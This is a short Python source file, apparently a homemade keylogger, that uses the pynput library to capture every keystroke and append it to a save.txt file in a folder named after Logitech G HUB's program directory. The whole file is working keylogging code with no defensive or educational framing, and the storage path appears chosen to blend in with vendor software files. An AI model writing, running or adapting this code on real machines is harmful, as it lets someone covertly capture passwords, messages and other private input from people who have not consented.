from pynput.keyboard import Key, Listener
import os

# array to stocks the pressed keys
keys = []
# file where the keys are written
target_folder = r'C:\Program_Files\LGHUB\scrapped'

keycode_to_char = {
    Key.space: '\n',
    Key.enter: '\n',
    Key.esc: '\n',
    
}

def get_key_representation(key):
    if key in keycode_to_char: # 'space', 'enter' or 'esc'  replaced by a line crossing
        return keycode_to_char[key]
    elif str(key).find("Key") == -1:    # as soon as it is not a a 'Key.()' key
        return str(key).replace("'","") # add the char replacing "'" by ""
        
# save the keys stocked in keys in the target file 'file_path'
def save(keys, file_path):
    with open(file_path,'a') as myfile:
        for key in keys:
            myfile.write(key)


def press_on(key):
    global keys
    print(key) 
    keys.append(get_key_representation(key)) #ajout de la touche préssée au tableau keys
    if key in keycode_to_char:
        global target_folder
        os.makedirs(target_folder, exist_ok=True)  
        save(keys, os.path.join(target_folder, 'save.txt'))
        keys = [] 
    

def press_off(key):
    if key == Key.esc:
        global target_folder
        save(keys, os.path.join(target_folder, 'save.txt'))
        return False

with Listener(on_press = press_on, on_release = press_off) as listener:
    listener.join()

